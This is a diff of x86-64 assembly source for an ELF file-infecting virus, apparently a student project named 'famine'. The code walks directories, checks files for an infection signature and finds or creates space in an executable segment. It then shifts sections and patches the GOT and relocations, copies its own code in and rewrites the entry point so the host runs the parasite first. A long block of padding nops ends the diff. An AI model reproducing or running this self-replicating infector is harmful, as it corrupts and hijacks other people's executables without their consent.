@@ -11,16 +11,9 @@ _start:
 	push rbp
     mov rbp, rsp
 	PUSHA
-    lea rdi, [rel dir1]                                   ; dir to open for arg readDir
+    lea rdi, [rel dir1]					; dir to open for arg readDir
     mov rsi, dir1Len
     call _readDir
-
-    ; debug
-    ; writeBack
-    ; mov rsi, tiret
-    ; writeWork
-    ; writeBack
-    ; writeBack
 
     lea rdi, [rel dir2]
     mov rsi, dir2Len
@@ -43,7 +36,7 @@ _readDir:
     mov [r8], rdi
     lea r8, FAM(famine.lenghtPwd)
     mov [r8], rsi
-    mov rax, SYS_OPEN 
+    mov rax, SYS_OPEN
     mov rsi, O_RDONLY | O_DIRECTORY
     xor rdx, rdx
     syscall
@@ -90,7 +83,7 @@ _readDir:
             ; ;debug
             ; writeWork
             ; writeBack
-            
+
 			_bf_chk_file:
 			call _check_file
 
@@ -105,12 +98,16 @@ _check_file:
 	push rbp
 	mov	rbp, rsp
 	sub rsp, infection_size
+	lea rax, INF(infection.injection_offset)
+	mov qword [rax], 0
+	lea rax, INF(infection.add_page)
+	mov byte [rax], 0
 
 	_open_file:
 		mov	rax, SYS_OPEN
 		mov rdi, rsi
 		mov rsi, O_RDWR
-		xor rdx, rdx 
+		xor rdx, rdx
 		syscall
 		cmp	rax, 0x0
 		jl	_leave_return
@@ -126,6 +123,7 @@ _check_file:
 		cmp rax, 0x0
 		jle _close_file_inf
 		mov INF(infection.map_size), rax
+		mov INF(infection.original_end), rax
 
 	_map_file:
 	; rax	-> map
@@ -142,144 +140,433 @@ _check_file:
 		lea r8, INF(infection.map_addr)
 		mov [r8], rax
 
-
 	_check_format:
 		cmp	dword [rax + 1], 0x02464c45				; if != 'ELF64'
 		jne _unmap_close_inf
 
-	_find_text_seg:
-	;*rax	-> map
+	_check_already_infected:
+	; rax	== total segment number
+	; r9	== injection offset
+	; r13	== original segment end offset
 	; r14	-> header table
-		mov r14, rax								; r14 -> elf start addr
-		add r14, [r14 + elf64_ehdr.e_phoff]			; r14 -> start of segment headers's table
-		movzx r15, word [rax + elf64_ehdr.e_phnum]	; r15 = number of segments (see _segment_loop)
-		xor rcx, rcx								; loop counter
+	; r15	-> map
+		mov r15, rax
+		mov r14, r15
+		add r14, [r14 + elf64_ehdr.e_phoff]
+		xor rcx, rcx
+		_go_to_last_segment:
+			cmp cx, [r15  + elf64_ehdr.e_phnum]
+			jge _go_to_last_segment_end	
+			add r14, elf64_phdr_size
+			inc rcx
+			jmp _go_to_last_segment
+		_go_to_last_segment_end:
+		mov	INF(infection.last_seg_hdr_addr), r14
+		xor r9, r9
+		; xor rcx, rcx
+		; mov cx, [r15  + elf64_ehdr.e_phnum]
+		_segment_loop:
+			cmp cx, 0
+			jle	_segment_loop_end
+			_check_segment_format:
+				bt word [r14], 0				; is segment header's first bit != 0
+				jnc _continue
+				bt qword [r14], 0x20			; is segment header's 33rd bit == 1
+				jc _handle_valid_segment
+			_continue:
+				dec rcx
+				sub r14, elf64_phdr_size
+				jmp _segment_loop
+
+		_segment_loop_end:
+			mov r9, INF(infection.injection_offset)
+			cmp r9, 0
+			je _unmap_close_inf
+			cmp byte INF(infection.add_page), 1						; if new page needed jump _add page
+			je _add_page
+			jmp _infection										; else jmp _infection
+
+		_handle_valid_segment:
+		; Check if the segment signed, else check the size, if big enough save the offsets if not already done
+			_check_signature:
+			; r8	-> potential signature
+			; r9	== signature variable
+				mov r8, r15
+				add r8, [r14 + elf64_phdr.p_offset]
+				add r8, [r14 + elf64_phdr.p_filesz]
+				sub r8, signature_len
+				mov r9, [rel signature]
+				cmp qword r9, [r8]
+				je _unmap_close_inf
+
+			_valid_seg_already_found:
+				mov r9, INF(infection.injection_offset)
+				test r9, r9
+				jz _check_cave_size
+				mov r9, INF(infection.add_page)
+				test r9, r9
+				jz _continue
+
+			_check_cave_size:
+			; r8	== end of infection offset
+			; r9	== next segment offset
+				mov r8, [r14 + elf64_phdr.p_offset]
+				add r8, [r14 + elf64_phdr.p_filesz]
+				mov r13, r8								; save segment end's offset
+				add r8, CODE_LEN
+				mov r9, r14
+				add r9, elf64_phdr_size
+				add r9, elf64_phdr.p_offset
+				cmp [r9], r8
+				setb INF(infection.add_page)			; if ([r9] < r8) { infection.add_page = 1) }
+				; jl _continue							; if (infection end's offset > next segment offset) continue segment loop
+
+			_save_offsets:
+			; r8	-> infection structure members
+			; r12	== original entrypoint
+			;*r13	== segment end's offset (_check_cave_size)
+			;*r14	-> segment header in header table
+				lea r8, INF(infection.seg_nb)
+				mov [r8], cl
+				lea r8, INF(infection.original_entry)
+				mov r12, [r15 + elf64_ehdr.e_entry]
+				mov [r8], r12
+				lea r8, INF(infection.injection_offset)
+				mov [r8], r13
+				add qword [r8], 0x10
+				and qword [r8], -16							; align
+				lea r8, INF(infection.seg_hdr_addr)
+				mov [r8], r14
+				jmp _continue
+
+_add_page:
+	_update_file_size:
+		mov rax, SYS_FTRUNCATE
+		mov rdi, INF(infection.file_fd)
+		lea rsi, INF(infection.map_size)
+		add qword [rsi], PAGE_SIZE
+		mov rsi, [rsi]
+		syscall
+		cmp rax, 0
+		jl _unmap_close_inf
+
+	_unmap_prev_map:
+		mov rdi, INF(infection.map_addr)
+		mov rsi, INF(infection.map_size)
+		mov rax, SYS_UNMAP
+		syscall
+
+	_remap_file:
+		mov rax, SYS_MMAP
+		mov	rdi, 0x0
+		mov rsi, INF(infection.map_size)				; rsi = file_size
+		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
+		mov r10, MAP_SHARED
+		mov r8, INF(infection.file_fd)
+		mov r9, 0x0
+		syscall
+		cmp	rax, 0x0									; rax -> map (used later)
+		jl _close_file_inf
+		lea r8, INF(infection.map_addr)
+		mov [r8], rax
+
+	mov rdi, PAGE_SIZE
+	call _update_seg_sizes
+
+	_update_section_size:
+	; rax	== total section number
+	; rcx	== section counter
+	; r8	== injection offset
+	; r9	== section offset we are writing in
+	; r10	-> section header that needs to be modified
+	; r14	-> sections header
+		mov r14, INF(infection.map_addr)
+		movzx rax, word [r14 + elf64_ehdr.e_shnum]
+		add r14, [r14 + elf64_ehdr.e_shoff]
+		mov r8, INF(infection.injection_offset)
+		xor r9, r9
+		xor rcx, rcx
+		_section_loop:
+			cmp	rcx, rax
+			jge _section_loop_end
+			cmp [r14 + elf64_shdr.sh_offset], r8
+			jge _section_loop_continue
+			cmp [r14 + elf64_shdr.sh_offset], r9
+			jle _section_loop_continue
+			mov r9, [r14 + elf64_shdr.sh_offset]
+			mov r10, r14
 	
-	_segment_loop:		; while (cx != r15){check segment p_type & p_flags & cave_size; rcx++ & phdr++}
-	;*r14	-> segment header
-	; r15	== segment number
-	; rcx	-> segment index counter
-		cmp rcx, r15
-		je	_unmap_close_inf
-		bt word [r14], 0							; segment is loadable (bit test r14's first bit)
-		jnc _continue
-		bt qword [r14], 0x20						; segment is executable (bit test r14's 33rd bit)
-		jc _valid_segment_found
-		_continue:
-		inc rcx
-		add r14, elf64_phdr_size					; r14 -> next_phdr(.p_type) (needed later)
-		jmp _segment_loop
+		_section_loop_continue:
+			inc rcx
+			add r14, elf64_shdr_size
+			jmp _section_loop
+	
+		_section_loop_end:
+			add qword [r10 + elf64_shdr.sh_size], PAGE_SIZE
 
-	_valid_segment_found:
-	; rbx	== segment end's offset
-		mov rbx, [r14 + elf64_phdr.p_offset]	; rbx = curr_phdr.offset
-		add rbx, [r14 + elf64_phdr.p_filesz]
-		lea r15, INF(infection.seg_end_offset)
-		mov [r15], rbx							; stock segment end offset
-		; add rbx, rax							; rbx -> end of segment
+	_update_next_seg_header:
+	; rax	== total segment number
+	; rcx	== segment counter
+	; r8	-> segment header data
+	; r9	== modified segment offset
+	; r10	== injection offset
+	; r14	-> next segmentS header
+	;*r15	-> map
+		mov r14, INF(infection.map_addr)
+		add r14, [r14 + elf64_ehdr.e_phoff]
+		mov r10, INF(infection.injection_offset)
+		movzx rax, word [r15 + elf64_ehdr.e_phnum]
+		xor rcx, rcx
+		_update_next_seg_loop:
+			cmp [r14 + elf64_phdr.p_offset], r10
+			jle _update_next_seg_continue
+			add qword [r14 + elf64_phdr.p_offset], PAGE_SIZE
+			add qword [r14 + elf64_phdr.p_vaddr], PAGE_SIZE
+			add qword [r14 + elf64_phdr.p_paddr], PAGE_SIZE
+			_update_next_seg_continue:
+				add r14, elf64_phdr_size
+				inc rcx
+				cmp rcx, rax
+				jl _update_next_seg_loop
+		_update_next_seg_end:
 		
-	_check_signature:
-	;*rbx	== segment end's offset
-	;*r14	-> segment header
-	; r15	-> potential signature
-	; === check if infected (read signature) ===
-		mov r15, rbx								; r15 == end of segment's offset
-		add r15, rax								; r15 -> end of segment 
-		push r15									; save end of segment
-		sub r15, _end - signature					; r15 -> start of potential signature
-		lea r13, signature
-		mov r13, [r13]								; r13 = signature[8]
-		cmp r13, qword [r15]						; strncmp(signature, (char *)r15, 8);
-		je	_unmap_close_inf
-		pop r15										; r15 -> end of segment
-		add r15, 0x10
-		and r15, -16								; align
+	_get_got_index:
+	; rcx	== index counter
+	; r8	-> shstrtab section
+	; r14	-> sections header
+		mov r14, INF(infection.map_addr)
+		movzx rcx, word [r14 + elf64_ehdr.e_shstrndx]
+		add r14, [r14 + elf64_ehdr.e_shoff]
+		
+		_go_to_shstrtab_loop:
+			cmp rcx, 0
+			je _shstrtab_loop_end
+			dec rcx
+			add r14, elf64_shdr_size
+			jmp _go_to_shstrtab_loop
+		_shstrtab_loop_end:
+		
+		mov r8, INF(infection.map_addr)
+		add r8, [r14 + elf64_shdr.sh_offset]
+		xor rcx, rcx
+		_strchr_loop:
+			cmp rcx, [r14 + elf64_shdr.sh_size]
+			jge	_strchr_loop_end
+		; ===========================================
+			; chercher ".got" + '\0'
+		; ===========================================
+			cmp dword [r8 + rcx], 0x746f672e
+			jne	_strchr_find_next
+			cmp dword [r8 + rcx + 4], 0x746c702e
+			jne	_strchr_loop_end
+			cmp byte [r8 + rcx + 8], 0
+			jne	_strchr_find_next
+			jmp _strchr_loop_end
+			
+			_strchr_find_next:
+				cmp byte [r8 + rcx], 0
+				je _strchr_continue
+				inc rcx
+				jmp _strchr_find_next
+			
+			_strchr_continue:
+				inc rcx
+				jmp _strchr_loop
+		_strchr_loop_end:
+			mov INF(infection.got_str_index), rcx
+	
+	_update_next_section_offset:
+	; see _update_next_seg_offset with "segment" = "section"
+		mov r14, INF(infection.map_addr)
+		movzx rax, word [r14 + elf64_ehdr.e_shnum]
+		add r14, [r14 + elf64_ehdr.e_shoff]
+		mov r10, INF(infection.injection_offset)
+		xor rcx, rcx
+		_update_section_loop:
+			cmp rcx, rax
+			jge _update_section_loop_end
+			call _update_rela_dyn
+			cmp [r14 + elf64_shdr.sh_offset], r10
+			jle	_update_loop_continue
+			call _update_got
+			add qword [r14 + elf64_shdr.sh_offset], PAGE_SIZE
+			cmp [r14 + elf64_shdr.sh_addr], r10
+			jle	_update_loop_continue
+			add qword [r14 + elf64_shdr.sh_addr], PAGE_SIZE
 
-	_check_cave_size:
-	;*rbx	== end of futur parasite's offset
-	; r13	-> signature
-	;*r14	-> segment header
-		add rbx, CODE_LEN						; rbx == end of futur parasite's offset
-		add rbx, 0x10
-		and rbx, -16							; align
-		mov r13, r14
-		add r13, elf64_phdr_size + elf64_phdr.p_offset		; r13 -> next_phdr.offset
-		cmp [r13], rbx							; if (next_phdr.offset <= offset_end_parasite)
-		; Check tous les segments
-		; Ne pas jump mais ajouter une page
-		jle	_continue
+		_update_loop_continue:
+			add r14, elf64_shdr_size
+			inc rcx
+			jmp _update_section_loop
+
+		_update_section_loop_end:
+
+	_update_e_shoff:
+	; rax	== injection offset
+	; r14	-> ehdr
+	; r8	== injection offset
+		mov r14, INF(infection.map_addr)
+		mov rax, INF(infection.injection_offset)
+		cmp [r14 + elf64_ehdr.e_shoff], rax
+		jl	_shift_content
+		add qword [r14 + elf64_ehdr.e_shoff], PAGE_SIZE
+		
+		jmp _shift_content
+
+	_update_got:
+		mov r11, INF(infection.got_str_index)
+		cmp [r14 + elf64_shdr.sh_name], r11d
+		jne _update_got_ret
+		push rcx
+		push r8
+		push r9
+		mov r8, INF(infection.map_addr)
+		add r8, [r14 + elf64_shdr.sh_offset]
+		xor rcx, rcx
+		
+		_update_got_loop:
+			cmp rcx, [r14 + elf64_shdr.sh_size]
+			jge	_update_got_end
+			mov r9, qword [r8 + rcx]
+			cmp r9, INF(infection.injection_offset)
+			jl	_update_got_continue
+			add qword [r8 + rcx], 0x1000
+		
+		_update_got_continue:
+			add rcx, 8
+			jmp _update_got_loop
+		
+		_update_got_end
+			pop r9
+			pop r8
+			pop rcx
+		_update_got_ret:
+			ret
+	
+	_update_rela_dyn:
+	; rcx	-> section counter
+	; r8	-> sections
+	;*r14	-> sections header
+		;mov r14, INF(infection.map_addr)
+		;movzx rcx, word [r14 + elf64_ehdr.e_shnum]
+		;add r14, [r14 + elf64_ehdr.e_shoff]
+		;_go_to_rela_dyn_loop:
+		;	mov r8, INF(infection.map_addr)
+		;	add r8, [r14 + elf64_shdr.sh_offset]
+		;	cmp dword [r14 + elf64_shdr.sh_type], SHT_RELA
+		;	je _go_to_rela_dyn_loop_end
+		;	cmp rcx, 0
+		;	je	_shift_content
+		;	dec rcx
+		;	add r14, elf64_shdr_size
+		;	jmp _go_to_rela_dyn_loop
+		;_go_to_rela_dyn_loop_end:	
+		
+		cmp dword [r14 + elf64_shdr.sh_type], SHT_RELA
+		jne	_rela_dyn_loop_ret
+		push r8
+		push rbx
+		push rax
+		mov r8, INF(infection.map_addr)
+		add r8, [r14 + elf64_shdr.sh_offset]
+		mov rbx, r8
+		add rbx, [r14 + elf64_shdr.sh_size]
+		mov rax, INF(infection.injection_offset)
+		
+		_rela_dyn_loop:
+			cmp r8, rbx
+			jge	_rela_dyn_loop_end
+			cmp [r8 + elf64_rela.r_offset], rax
+			jl _rela_dyn_loop_continue
+			add qword [r8 + elf64_rela.r_offset], PAGE_SIZE
+			
+			_rela_dyn_loop_continue:
+				add r8, elf64_rela_size
+				jmp _rela_dyn_loop
+		
+		_rela_dyn_loop_end:
+			pop rax
+			pop rbx
+			pop r8
+		_rela_dyn_loop_ret:
+			ret
+
+	_shift_content:
+	; rdi	-> fin du fichier + PAGE_SIZE
+	; rsi	-> fin du fichier
+	; rcx	== offset from injection offset to end of file
+		mov rdi, INF(infection.map_addr)
+		add rdi, INF(infection.map_size)
+		mov rsi, rdi
+		sub rsi, PAGE_SIZE
+		mov rcx, INF(infection.original_end)
+		sub rcx, INF(infection.injection_offset)
+		std
+		rep movsb
+	
 
 _infection:
-;*rax	-> map
-; r11	== entrypoint offset 
-; r12	-> ehdr.e_entry
-; r13	== original entrypoint offset
-;*r14	-> segment header
-;*r15	-> injection beginning
+	_update_elf_hdr:
+	; r8	-> elf header entrypoint
+	; r9	== end of segment + align (injection offset)
+	; r10	== injection offset
+		mov r8, INF(infection.map_addr)
+		add r8, elf64_ehdr.e_entry
+		mov r10, INF(infection.injection_offset)
+		mov [r8], r10
+	
+	cmp byte INF(infection.add_page), 0
+	jg _copy_parasite
+	mov rdi, CODE_LEN
+	call _update_seg_sizes
 
-	; === stock original entrypoint === 
-	mov r12, rax
-	add r12, elf64_ehdr.e_entry 			; r12 -> ehdr.e_entry
-	mov r13, [r12]							; r13 = original entry offset (we save r12 for later)
-	
-	_update_entrypoint:
-	; r11	== injection offset
-	;*r12	-> ehdr.e_entry
-	;*rbx	-> segment end
-	; ehdr->e_entry = (Elf64_Addr)(cave_segment->p_vaddr + cave_segment->p_memsz);
-		lea r11, INF(infection.seg_end_offset)
-		mov r11, [r11]
-		add r11, 0x10
-		and r11, -16
-		mov [r12], r11							; ehdr.e_entry = injection offset
-	
-	_update_seg_hdr:
-	; r12	-> phdr.filesz
-	;*r14	-> segment header
-		mov r12, r14
-		add r12, elf64_phdr.p_filesz
-		add	qword [r12], 0x10
-		and qword [r12], -16
-		add	qword [r12], qword CODE_LEN
-		add r14, elf64_phdr.p_memsz
-		add qword [r14], 0x10
-		and qword [r14], -16
-		add qword [r14], qword CODE_LEN
-	
 	_copy_parasite:
-	;*r15	-> segment_end
-	;*rbx	-> segment_end
-		mov rdi, r15							; rdi -> end of curr_seg(start of injection)
+	; rdi	-> injection start
+	; rsi	-> parasite _start
+	; rcx	== code len (_end - _start)
+		mov rdi, INF(infection.map_addr)
+		add rdi, INF(infection.injection_offset)
 		lea rsi, [rel _start]					; rsi -> start of our code
 		mov rcx, CODE_LEN						; counter will decrement
 		cld										; copy from _start to _end (= !std)
 		rep movsb
-	
-	_update_parasite_jmp:
-	;*rax	-> map
-	; r10	== offset between final_jmp and original entry
-	;*r11	== injection offset
-	;*r12	-> ehdr.e_entry
-	;*r13	== original entry offset
-	; r15	-> _final_jmp
-	; jmp_offset = original_entry - (entry_offset + final_jmp_offset_in_parasite + 5); 
-		; mov r15, _final_jmp
-		; mov r14, _start
-		; sub r15, r14							; r15 == _final_jmp offset
-		; mov r15, rax							; r15 -> final_jmp in map
-		; add r15, r11
-		add r15, FINJMP_OFF
-		inc r15	
-		mov r10, r11
-		add r10, FINJMP_OFF
-		; sub r13, r10
-		sub r10, r13
+
+	_update_final_jump:
+	; r8 -> _bf_exit instruction's addr (_bf_exit + 1)
+	; r9 == distance to jump from final jump to original entry point
+		mov r8, INF(infection.map_addr)
+		add r8, INF(infection.injection_offset)
+		add r8, FINJMP_OFF
+		mov r10, r8
+		inc r8
+		mov r9, INF(infection.map_addr)
+		add r9, INF(infection.original_entry)
 		add r10, 0x05
-		neg r10;
-		mov [r15], r10d
+		sub r9, r10
+		mov [r8], r9d
 		jmp _unmap_close_inf
 
-; *** pas obligatoire ***
+_update_seg_sizes:
+; r8	-> segment header data
+;*r14	-> segment header in header table
+
+	mov r8, INF(infection.seg_hdr_addr)
+	push r8											; save header start for later
+
+	; * Update file size *
+	add r8, qword elf64_phdr.p_filesz
+	add qword [r8], 0x10
+	and qword [r8], -16								; align before parasite code
+	add qword [r8], rdi								; add length of parasite code
+	pop r8
+
+	; * Update memory size *
+	add r8, elf64_phdr.p_memsz
+	add qword [r8], 0x10
+	and qword [r8], -16								; align before parasite code
+	add qword [r8], rdi						; add length of parasite code
+	
+	ret
 
 _unmap_close_inf:
 	lea rdi, INF(infection.map_addr)
@@ -332,7 +619,7 @@ _strcpy:
 ; strlen(str:rsi)
 _strlen:
 	xor rcx, rcx
-	
+
 	ft_strlen_loop:
 		cmp	byte [rsi + rcx], 0
 		je	ft_strlen_end
@@ -343,13 +630,2568 @@ _strlen:
 		mov rax, rcx
 		ret
 
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
